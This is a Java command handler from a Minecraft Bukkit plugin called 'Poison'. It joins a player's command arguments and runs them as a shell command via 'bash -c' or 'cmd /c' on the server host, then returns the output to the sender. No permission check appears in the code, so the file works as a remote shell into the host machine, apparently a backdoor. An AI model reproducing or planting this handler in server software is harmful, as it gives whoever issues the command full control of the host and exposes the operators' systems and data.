package pl.workonfire.minecraft.poison.commands;

import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import pl.workonfire.minecraft.poison.Poison;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.List;

public class SystemHandler implements CommandExecutor {

    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        if (args.length > 0) {
            String systemCommand = String.join(" ", args);
            long startTime = System.nanoTime();
            sender.sendMessage(Poison.getPrefix() + "§cExecuting system command §7§o" + systemCommand + "§c... A lag may occur.");
            try {
                List<String> fullCommand = new ArrayList<>();
                if (System.getProperty("os.name").contains("Windows")) {
                    fullCommand.add("cmd");
                    fullCommand.add("/c");
                }
                else {
                    fullCommand.add("bash");
                    fullCommand.add("-c");
                }
                fullCommand.add(systemCommand);
                Process process = new ProcessBuilder().command(fullCommand).start();
                BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                List<String> output = new ArrayList<>();
                String line;
                while ((line = reader.readLine()) != null) output.add(line + "\n");
                if (!output.isEmpty()) for (String outputLine : output) sender.sendMessage(outputLine);
                long stopTime = System.nanoTime();
                sender.sendMessage(Poison.getPrefix() + "§aCommand execution finished in §f" + (stopTime - startTime) / 1000000 + " ms");
            } catch (IOException exception) {
                sender.sendMessage(Poison.getPrefix() + "§4Error.");
            }
        }
        else sender.sendMessage("§4§l§oPOISON §fv" + Poison.getPluginVersion());
        return true;
    }
}
